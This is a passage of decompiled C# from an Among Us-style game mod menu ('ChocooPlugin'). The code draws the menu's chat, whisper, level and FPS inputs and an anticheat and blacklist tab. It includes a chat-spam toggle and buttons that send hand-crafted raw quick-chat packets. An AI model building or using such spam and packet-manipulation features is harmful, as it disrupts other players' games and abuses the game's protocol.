      GUIStyle guiStyle = new GUIStyle(GUI.skin.label)
      {
        fontSize = 12,
        wordWrap = true,
        alignment = (TextAnchor) 0,
        normal = new GUIStyleState()
        {
          textColor = Color.white
        }
      };
      string str1 = this.chatMessage;
      if (this.chatBoxFocused && this.showCursor && this.cursorPosition >= 0 && this.cursorPosition <= this.chatMessage.Length)
        str1 = this.chatMessage.Insert(this.cursorPosition, "|");
      if (string.IsNullOrEmpty(this.chatMessage) && !this.chatBoxFocused)
      {
        GUI.contentColor = Color.gray;
        GUI.Label(rect2, "Click here to type...", guiStyle);
        GUI.contentColor = ChocooPlugin.GetRGBText();
      }
      else if (string.IsNullOrEmpty(this.chatMessage) && this.chatBoxFocused && !this.showCursor)
      {
        GUI.contentColor = new Color(0.5f, 0.5f, 0.5f, 0.3f);
        GUI.Label(rect2, "Start typing...", guiStyle);
        GUI.contentColor = ChocooPlugin.GetRGBText();
      }
      else if (string.IsNullOrEmpty(str1) && this.chatBoxFocused)
        GUI.Label(rect2, "|", guiStyle);
      else
        GUI.Label(rect2, str1, guiStyle);
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(10f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      float num = Time.time - this.lastChatSendTime;
      bool flag2 = (double) num >= 3.0;
      GUI.backgroundColor = flag2 ? new Color(0.2f, 0.7f, 0.3f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
      GUI.enabled = flag2;
      if (GUILayout.Button(flag2 ? "SEND" : $"SEND ({(ValueType) (float) (3.0 - (double) num):F1}s)", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
      {
        if (!string.IsNullOrWhiteSpace(this.chatMessage))
          this.SendChatMessage(this.chatMessage.Trim());
        this.chatBoxFocused = false;
      }
      GUI.enabled = true;
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.5f, 0.3f, 0.1f, 1f);
      if (GUILayout.Button("CLEAR", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
      {
        this.chatMessage = "";
        this.cursorPosition = 0;
        this.chatBoxFocused = false;
      }
      GUILayout.EndHorizontal();
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(10f);
      GUI.backgroundColor = new Color(0.9f, 0.4f, 0.1f, 1f);
      if (GUILayout.Button("WEIRD CHAT", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
      {
        ChocooPlugin.SendWeirdQuickChat();
        this.chatBoxFocused = false;
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(0.5f, 0.2f, 0.9f);
      GUILayout.Label("Coloured Chat Options", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1,
        fontSize = 11
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = new Color(0.8f, 0.2f, 0.2f, 1f);
      if (GUILayout.Button("1", new GUILayoutOption[2]
      {
        GUILayout.Height(30f),
        GUILayout.Width(40f)
      }))
      {
        ChocooPlugin.SendQuickChatRaw((byte) 3, (ushort) 78, (byte) 1, (byte) 2, (ushort) 1912);
        this.chatBoxFocused = false;
      }
      GUILayout.Space(3f);
      GUI.backgroundColor = new Color(0.2f, 0.6f, 0.8f, 1f);
      if (GUILayout.Button("2", new GUILayoutOption[2]
      {
        GUILayout.Height(30f),
        GUILayout.Width(40f)
      }))
      {
        ChocooPlugin.SendQuickChatRaw((byte) 3, (ushort) 78, (byte) 1, (byte) 2, (ushort) 197);
        this.chatBoxFocused = false;
      }
      GUILayout.Space(3f);
      GUI.backgroundColor = new Color(0.2f, 0.7f, 0.5f, 1f);
      if (GUILayout.Button("3", new GUILayoutOption[2]
      {
        GUILayout.Height(30f),
        GUILayout.Width(40f)
      }))
      {
        ChocooPlugin.SendQuickChatRaw((byte) 3, (ushort) 78, (byte) 1, (byte) 2, (ushort) 155);
        this.chatBoxFocused = false;
      }
      GUILayout.Space(3f);
      GUI.backgroundColor = new Color(0.6f, 0.4f, 0.8f, 1f);
      if (GUILayout.Button("4", new GUILayoutOption[2]
      {
        GUILayout.Height(30f),
        GUILayout.Width(40f)
      }))
      {
        ChocooPlugin.SendQuickChatRaw((byte) 3, (ushort) 78, (byte) 1, (byte) 2, (ushort) 156);
        this.chatBoxFocused = false;
      }
      GUILayout.Space(3f);
      GUI.backgroundColor = new Color(0.8f, 0.6f, 0.2f, 1f);
      if (GUILayout.Button("5", new GUILayoutOption[2]
      {
        GUILayout.Height(30f),
        GUILayout.Width(40f)
      }))
      {
        ChocooPlugin.SendQuickChatRaw((byte) 3, (ushort) 78, (byte) 1, (byte) 2, (ushort) 73);
        this.chatBoxFocused = false;
      }
      GUILayout.EndHorizontal();
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = new Color(0.9f, 0.3f, 0.9f, 1f);
      if (GUILayout.Button("6", new GUILayoutOption[2]
      {
        GUILayout.Height(30f),
        GUILayout.Width(40f)
      }))
      {
        ChocooPlugin.SendQuickChatRaw((byte) 3, (ushort) 78, (byte) 1, (byte) 2, (ushort) 1914);
        this.chatBoxFocused = false;
      }
      GUILayout.Space(3f);
      GUI.backgroundColor = new Color(0.9f, 0.4f, 0.6f, 1f);
      if (GUILayout.Button("7", new GUILayoutOption[2]
      {
        GUILayout.Height(30f),
        GUILayout.Width(40f)
      }))
      {
        ChocooPlugin.SendQuickChatRaw((byte) 3, (ushort) 78, (byte) 1, (byte) 2, (ushort) 1567);
        this.chatBoxFocused = false;
      }
      GUILayout.Space(3f);
      GUI.backgroundColor = new Color(0.7f, 0.5f, 0.9f, 1f);
      if (GUILayout.Button("8", new GUILayoutOption[2]
      {
        GUILayout.Height(30f),
        GUILayout.Width(40f)
      }))
      {
        ChocooPlugin.SendQuickChatRaw((byte) 3, (ushort) 78, (byte) 1, (byte) 2, (ushort) 6);
        this.chatBoxFocused = false;
      }
      GUILayout.Space(3f);
      GUI.backgroundColor = new Color(0.5f, 0.6f, 0.9f, 1f);
      if (GUILayout.Button("9", new GUILayoutOption[2]
      {
        GUILayout.Height(30f),
        GUILayout.Width(40f)
      }))
      {
        ChocooPlugin.SendQuickChatRaw((byte) 3, (ushort) 78, (byte) 1, (byte) 2, (ushort) 269);
        this.chatBoxFocused = false;
      }
      GUILayout.Space(3f);
      GUI.backgroundColor = new Color(1f, 0.5f, 0.3f, 1f);
      if (GUILayout.Button("10", new GUILayoutOption[2]
      {
        GUILayout.Height(30f),
        GUILayout.Width(40f)
      }))
      {
        ChocooPlugin.SendQuickChatRaw((byte) 3, (ushort) 78, (byte) 1, (byte) 2, (ushort) 96 /*0x60*/);
        this.chatBoxFocused = false;
      }
      GUILayout.EndHorizontal();
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = new Color(0.3f, 0.9f, 0.5f, 1f);
      if (GUILayout.Button("11", new GUILayoutOption[2]
      {
        GUILayout.Height(30f),
        GUILayout.Width(40f)
      }))
      {
        ChocooPlugin.SendQuickChatRaw((byte) 3, (ushort) 78, (byte) 1, (byte) 2, (ushort) 95);
        this.chatBoxFocused = false;
      }
      GUILayout.Space(3f);
      GUI.backgroundColor = new Color(0.5f, 0.3f, 0.9f, 1f);
      if (GUILayout.Button("12", new GUILayoutOption[2]
      {
        GUILayout.Height(30f),
        GUILayout.Width(40f)
      }))
      {
        ChocooPlugin.SendQuickChatRaw((byte) 3, (ushort) 78, (byte) 1, (byte) 2, (ushort) 700);
        this.chatBoxFocused = false;
      }
      GUILayout.Space(3f);
      GUI.backgroundColor = new Color(0.9f, 0.7f, 0.3f, 1f);
      if (GUILayout.Button("13", new GUILayoutOption[2]
      {
        GUILayout.Height(30f),
        GUILayout.Width(40f)
      }))
      {
        ChocooPlugin.SendQuickChatRaw((byte) 3, (ushort) 78, (byte) 1, (byte) 2, (ushort) 350);
        this.chatBoxFocused = false;
      }
      GUILayout.Space(3f);
      GUI.backgroundColor = new Color(0.3f, 0.5f, 0.9f, 1f);
      if (GUILayout.Button("14", new GUILayoutOption[2]
      {
        GUILayout.Height(30f),
        GUILayout.Width(40f)
      }))
      {
        ChocooPlugin.SendQuickChatRaw((byte) 3, (ushort) 78, (byte) 1, (byte) 2, (ushort) 400);
        this.chatBoxFocused = false;
      }
      GUILayout.Space(3f);
      GUI.backgroundColor = new Color(0.9f, 0.3f, 0.5f, 1f);
      if (GUILayout.Button("15", new GUILayoutOption[2]
      {
        GUILayout.Height(30f),
        GUILayout.Width(40f)
      }))
      {
        ChocooPlugin.SendQuickChatRaw((byte) 3, (ushort) 78, (byte) 1, (byte) 2, (ushort) 1650);
        this.chatBoxFocused = false;
      }
      GUILayout.EndHorizontal();
      GUILayout.Space(3f);
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(10f);
      GUILayout.Space(10f);
      bool flag3 = flag2 && this.selectedWhisperTargetId != -1;
      GUI.backgroundColor = flag3 ? new Color(0.6f, 0.2f, 0.9f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
      GUI.enabled = flag3;
      string str2 = this.selectedWhisperTargetId != -1 ? "WHISPER" : "WHISPER (Select Player)";
      if (!flag2 && this.selectedWhisperTargetId != -1)
        str2 = $"WHISPER ({(ValueType) (float) (3.0 - (double) num):F1}s)";
      if (GUILayout.Button(str2, new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
      {
        if (!string.IsNullOrWhiteSpace(this.chatMessage))
          this.SendWhisperMessage(this.chatMessage.Trim(), this.selectedWhisperTargetId);
        this.chatBoxFocused = false;
      }
      GUI.enabled = true;
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(5f);
      GUI.contentColor = this.chatBoxFocused ? new Color(0.3f, 1f, 0.3f) : Color.gray;
      GUILayout.Label($"{(this.chatBoxFocused ? (object) "[FOCUSED]" : (object) "[Click box to type]")} | Chars: {this.chatMessage.Length}/{100}", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9,
        alignment = (TextAnchor) 5
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(10f);
      if (this.DrawToggleSwitchWithReturn("Spam Chat", ref ChocooPlugin.ChocooMenu.SpamChatEnabled))
        this.chatBoxFocused = false;
      if (ChocooPlugin.ChocooMenu.SpamChatEnabled)
      {
        GUILayout.Space(5f);
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
        GUI.contentColor = Color.red;
        GUILayout.Label("⚠️ SPAM ACTIVE", new GUIStyle(GUI.skin.label)
        {
          fontStyle = (FontStyle) 1,
          fontSize = 11,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = Color.yellow;
        if (!string.IsNullOrWhiteSpace(this.chatMessage))
          GUILayout.Label($"Spamming: \"{this.chatMessage}\"", new GUIStyle(GUI.skin.label)
          {
            fontSize = 10,
            alignment = (TextAnchor) 4,
            wordWrap = true
          }, (Il2CppReferenceArray<GUILayoutOption>) null);
        else
          GUILayout.Label("Enter a message to spam!", new GUIStyle(GUI.skin.label)
          {
            fontSize = 10,
            alignment = (TextAnchor) 4
          }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
        GUILayout.EndVertical();
        GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      }
      GUILayout.Space(10f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(0.6f, 0.2f, 0.9f);
      GUILayout.Label("Select Player to Whisper", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1,
        fontSize = 11
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      this.whisperPlayerScrollPosition = GUILayout.BeginScrollView(this.whisperPlayerScrollPosition, new GUILayoutOption[1]
      {
        GUILayout.Height(120f)
      });
      if (PlayerControl.AllPlayerControls != null && PlayerControl.AllPlayerControls.Count > 0)
      {
        foreach (PlayerControl cachedPlayer in this._cachedPlayers)
        {
          if (Object.op_Inequality((Object) cachedPlayer, (Object) null) && Object.op_Inequality((Object) cachedPlayer.Data, (Object) null) && !cachedPlayer.Data.Disconnected && Object.op_Inequality((Object) cachedPlayer, (Object) null) && Object.op_Inequality((Object) cachedPlayer.Data, (Object) null) && !cachedPlayer.Data.Disconnected && (int) cachedPlayer.PlayerId != (int) PlayerControl.LocalPlayer.PlayerId)
          {
            string str3 = this.StripHtmlTags(cachedPlayer.Data.PlayerName) ?? "Unknown";
            GUI.backgroundColor = this.selectedWhisperTargetId == (int) cachedPlayer.PlayerId ? new Color(0.6f, 0.2f, 0.9f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
            if (GUILayout.Button(str3, new GUILayoutOption[1]
            {
              GUILayout.Height(25f)
            }))
            {
              this.selectedWhisperTargetId = (int) cachedPlayer.PlayerId;
              this.chatBoxFocused = false;
            }
            GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
          }
        }
      }
      else
      {
        GUI.contentColor = Color.gray;
        GUILayout.Label("No players in lobby", new GUIStyle(GUI.skin.label)
        {
          fontSize = 10,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
      }
      GUILayout.EndScrollView();
      if (this.selectedWhisperTargetId != -1)
      {
        PlayerControl playerControl = ((IEnumerable<PlayerControl>) this._cachedPlayers).FirstOrDefault<PlayerControl>((Func<PlayerControl, bool>) (p => Object.op_Inequality((Object) p, (Object) null) && (int) p.PlayerId == this.selectedWhisperTargetId));
        if (Object.op_Inequality((Object) playerControl, (Object) null))
        {
          GUILayout.Space(5f);
          GUI.contentColor = new Color(0.6f, 0.2f, 0.9f);
          GUILayout.Label("Selected: " + playerControl.Data.PlayerName, new GUIStyle(GUI.skin.label)
          {
            fontSize = 10,
            alignment = (TextAnchor) 4,
            fontStyle = (FontStyle) 1
          }, (Il2CppReferenceArray<GUILayoutOption>) null);
          GUI.contentColor = ChocooPlugin.GetRGBText();
        }
        else
          this.selectedWhisperTargetId = -1;
      }
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(10f);
      GUI.enabled = true;
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = Color.yellow;
      GUILayout.Label("How to Use", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1,
        fontSize = 10
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = Color.gray;
      GUILayout.Label("• Click chat box to start typing", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Enter = new line | Shift+Enter = send", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Hold Backspace to delete continuously", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Arrow keys to move cursor", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Ctrl+C/V for copy/paste", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Press ESC to stop typing", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Whisper = private message", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Spam = auto-send every 3 seconds", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndScrollView();
      if (!this.chatBoxFocused || !Input.GetKeyDown((KeyCode) 27))
        return;
      this.chatBoxFocused = false;
    }

    private void DrawLevelInputBox(
      ref string inputText,
      ref bool isFocused,
      float width,
      float height)
    {
      Rect rect = GUILayoutUtility.GetRect(width, height);
      if (Event.current.type == null && ((Rect) ref rect).Contains(Event.current.mousePosition))
      {
        isFocused = true;
        Event.current.Use();
      }
      if (Event.current.type == null && !((Rect) ref rect).Contains(Event.current.mousePosition))
        isFocused = false;
      if (isFocused)
      {
        Event current = Event.current;
        if (current.type == 4)
        {
          if (current.keyCode == 13 || current.keyCode == 271 || current.keyCode == 27)
          {
            isFocused = false;
            current.Use();
          }
          else if (current.keyCode == 8)
          {
            if (inputText.Length > 0)
              inputText = inputText.Substring(0, inputText.Length - 1);
            current.Use();
          }
        }
        if (current.type == 4 && current.character > char.MinValue)
        {
          char character = current.character;
          if (character >= '0' && character <= '9')
          {
            if (inputText.Length < 6)
              inputText += character.ToString();
            current.Use();
          }
          else if (character == '\b')
            current.Use();
        }
      }
      GUI.backgroundColor = new Color(0.2f, 0.2f, 0.2f, 1f);
      GUI.Box(rect, "", GUI.skin.box);
      GUI.backgroundColor = Color.white;
      GUIStyle guiStyle = new GUIStyle(GUI.skin.label)
      {
        alignment = (TextAnchor) 4,
        fontSize = 11
      };
      if (string.IsNullOrEmpty(inputText))
      {
        GUI.contentColor = isFocused ? new Color(0.7f, 0.7f, 0.7f) : Color.gray;
        GUI.Label(rect, isFocused ? "|" : "0", guiStyle);
        GUI.contentColor = Color.white;
      }
      else
      {
        string str = inputText;
        if (isFocused && (int) ((double) Time.time * 2.0) % 2 == 0)
          str += "|";
        GUI.Label(rect, str, guiStyle);
      }
      if (!isFocused)
        return;
      GUI.color = ChocooPlugin.GetRGBColor();
      GUI.Box(rect, "", GUI.skin.box);
      GUI.color = Color.white;
    }

    private void DrawFPSInputBox(
      ref string inputText,
      ref bool isFocused,
      float width,
      float height)
    {
      Rect rect = GUILayoutUtility.GetRect(width, height);
      if (Event.current.type == null && ((Rect) ref rect).Contains(Event.current.mousePosition))
      {
        isFocused = true;
        Event.current.Use();
      }
      if (Event.current.type == null && !((Rect) ref rect).Contains(Event.current.mousePosition))
        isFocused = false;
      if (isFocused)
      {
        Event current = Event.current;
        if (current.type == 4)
        {
          if (current.keyCode == 13 || current.keyCode == 271 || current.keyCode == 27)
          {
            isFocused = false;
            current.Use();
          }
          else if (current.keyCode == 8)
          {
            if (inputText.Length > 0)
              inputText = inputText.Substring(0, inputText.Length - 1);
            current.Use();
          }
        }
        if (current.type == 4 && current.character > char.MinValue)
        {
          char character = current.character;
          if (character >= '0' && character <= '9')
          {
            if (inputText.Length < 4)
              inputText += character.ToString();
            current.Use();
          }
          else if (character == '\b')
            current.Use();
        }
      }
      GUI.backgroundColor = new Color(0.2f, 0.2f, 0.2f, 1f);
      GUI.Box(rect, "", GUI.skin.box);
      GUI.backgroundColor = Color.white;
      GUIStyle guiStyle = new GUIStyle(GUI.skin.label)
      {
        alignment = (TextAnchor) 4,
        fontSize = 11
      };
      if (string.IsNullOrEmpty(inputText))
      {
        GUI.contentColor = isFocused ? new Color(0.7f, 0.7f, 0.7f) : Color.gray;
        GUI.Label(rect, isFocused ? "|" : "60", guiStyle);
        GUI.contentColor = Color.white;
      }
      else
      {
        string str = inputText;
        if (isFocused && (int) ((double) Time.time * 2.0) % 2 == 0)
          str += "|";
        GUI.Label(rect, str, guiStyle);
      }
      if (!isFocused)
        return;
      GUI.color = ChocooPlugin.GetRGBColor();
      GUI.Box(rect, "", GUI.skin.box);
      GUI.color = Color.white;
    }

    private void DrawAnticheatTab()
    {
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 0.2f, 0.2f);
      GUILayout.Label("Anticheat System", new GUIStyle(GUI.skin.label)
      {
        fontSize = 14,
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(10f);
      this.scrollPosition = GUILayout.BeginScrollView(this.scrollPosition, false, true, GUIStyle.none, GUI.skin.verticalScrollbar, Array.Empty<GUILayoutOption>());
      this.DrawToggleSwitch("Enable Anticheat", ref ChocooPlugin.AnticheatEnabled);
      if (ChocooPlugin.AnticheatEnabled)
      {
        GUILayout.Space(5f);
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
        GUI.contentColor = Color.green;
        GUILayout.Label("✓ Anticheat Active", new GUIStyle(GUI.skin.label)
        {
          fontStyle = (FontStyle) 1,
          fontSize = 10,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
        GUILayout.EndVertical();
        GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      }
      GUILayout.Space(10f);
      this.DrawToggleSwitch("Auto-Ban Cheaters (Host)", ref ChocooPlugin.AutoBanEnabled);
      if (ChocooPlugin.AutoBanEnabled)
      {
        GUILayout.Space(5f);
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
        GUI.contentColor = Color.red;
        GUILayout.Label("⚠️ AUTO-BAN ENABLED", new GUIStyle(GUI.skin.label)
        {
          fontStyle = (FontStyle) 1,
          fontSize = 11,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = Color.gray;
        GUILayout.Label("Detected cheaters will be banned", new GUIStyle(GUI.skin.label)
        {
          fontSize = 9,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
        GUILayout.EndVertical();
        GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      }
      GUILayout.Space(15f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 0.3f, 0.3f);
      GUILayout.Label("Friend Code Blacklist", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = new Color(0.2f, 0.2f, 0.2f, 1f);
      Rect rect1 = GUILayoutUtility.GetRect(GUIContent.none, GUI.skin.box, new GUILayoutOption[2]
      {
        GUILayout.Height(24f),
        GUILayout.Width(160f)
      });
      GUI.Box(rect1, "", GUI.skin.box);
      if (GUI.Button(rect1, "", GUIStyle.none))
        this.blacklistInputFocused = true;
      Rect rect2;
      // ISSUE: explicit constructor call
      ((Rect) ref rect2).\u002Ector(((Rect) ref rect1).x + 4f, ((Rect) ref rect1).y + 4f, ((Rect) ref rect1).width - 8f, ((Rect) ref rect1).height - 8f);
      GUIStyle guiStyle = new GUIStyle(GUI.skin.label)
      {
        fontSize = 11,
        alignment = (TextAnchor) 3,
        normal = new GUIStyleState()
        {
          textColor = Color.white
        }
      };
      string str = this.blacklistInput;
      if (this.blacklistInputFocused && this.blacklistCursorVisible)
        str = this.blacklistInput.Insert(Mathf.Clamp(this.blacklistCursorPos, 0, this.blacklistInput.Length), "|");
      if (string.IsNullOrEmpty(this.blacklistInput) && !this.blacklistInputFocused)
      {
        GUI.contentColor = Color.gray;
        GUI.Label(rect2, "e.g. mostwanted#8746", guiStyle);
        GUI.contentColor = ChocooPlugin.GetRGBText();
      }
      else
        GUI.Label(rect2, str, guiStyle);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.2f, 0.7f, 0.3f, 1f);
      if (GUILayout.Button("Add", new GUILayoutOption[2]
      {
        GUILayout.Height(24f),
        GUILayout.Width(40f)
      }) && !string.IsNullOrWhiteSpace(this.blacklistInput))
      {
        ChocooPlugin.SaveToBlacklist(this.blacklistInput.Trim());
        this.blacklistAddedMessage = "Added: " + this.blacklistInput.Trim();
        this.blacklistMessageTimer = 3f;
        this.blacklistInput = "";
        this.blacklistCursorPos = 0;
        this.blacklistInputFocused = false;
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.EndHorizontal();
      if ((double) this.blacklistMessageTimer > 0.0)
      {
        GUILayout.Space(3f);
        GUI.contentColor = Color.green;
        GUILayout.Label(this.blacklistAddedMessage, new GUIStyle(GUI.skin.label)
        {
          fontSize = 9,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
      }
      GUILayout.Space(8f);
      GUI.contentColor = Color.yellow;
      GUILayout.Label($"Blacklisted ({ChocooPlugin.BlacklistedCodes.Count.ToString()}):", new GUIStyle(GUI.skin.label)
      {
        fontSize = 10,
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      this.blacklistScrollPosition = GUILayout.BeginScrollView(this.blacklistScrollPosition, new GUILayoutOption[1]
      {
        GUILayout.Height(80f)
      });
      if (ChocooPlugin.BlacklistedCodes.Count == 0)
      {
        GUI.contentColor = Color.gray;
        GUILayout.Label("No entries yet", new GUIStyle(GUI.skin.label)
        {
          fontSize = 9,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
      }
      else
      {
        foreach (string friendCode in new HashSet<string>((IEnumerable<string>) ChocooPlugin.BlacklistedCodes))
        {
          GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
          GUI.contentColor = Color.red;
          GUILayout.Label("⛔ " + friendCode, new GUIStyle(GUI.skin.label)
          {
            fontSize = 10
          }, (Il2CppReferenceArray<GUILayoutOption>) null);
          GUI.contentColor = ChocooPlugin.GetRGBText();
          GUILayout.FlexibleSpace();
          GUI.backgroundColor = new Color(0.6f, 0.1f, 0.1f, 1f);
          if (GUILayout.Button("X", new GUILayoutOption[2]
          {
            GUILayout.Width(20f),
            GUILayout.Height(18f)
          }))
          {
            ChocooPlugin.RemoveFromBlacklist(friendCode);
            break;
          }
          GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
          GUILayout.EndHorizontal();
        }
      }
      GUILayout.EndScrollView();
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 0.5f, 0.2f);
      GUILayout.Label("Detection Options", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      this.DrawToggleSwitch("Abnormal Color Change", ref ChocooPlugin.CheckAbnormalColorChange);
      this.DrawToggleSwitch("Abnormal Cosmetic Change", ref ChocooPlugin.CheckAbnormalCosmeticChange);
      this.DrawToggleSwitch("Abnormal Task Completion", ref ChocooPlugin.CheckAbnormalTaskCompletion);
      this.DrawToggleSwitch("Abnormal Murder", ref ChocooPlugin.CheckAbnormalMurder);
      this.DrawToggleSwitch("Abnormal Level", ref ChocooPlugin.CheckAbnormalLevel);
      this.DrawToggleSwitch("Abnormal Protect", ref ChocooPlugin.CheckAbnormalProtect);
      this.DrawToggleSwitch("Abnormal Shapeshift", ref ChocooPlugin.CheckAbnormalShapeshift);
      this.DrawToggleSwitch("Abnormal Vanish", ref ChocooPlugin.CheckAbnormalVanish);
      this.DrawToggleSwitch("Abnormal Venting", ref ChocooPlugin.CheckAbnormalVenting);
      this.DrawToggleSwitch("Abnormal Report/Meeting", ref ChocooPlugin.CheckAbnormalReportMeeting);
      this.DrawToggleSwitch("Abnormal Platforms", ref ChocooPlugin.CheckAbnormalPlatforms);
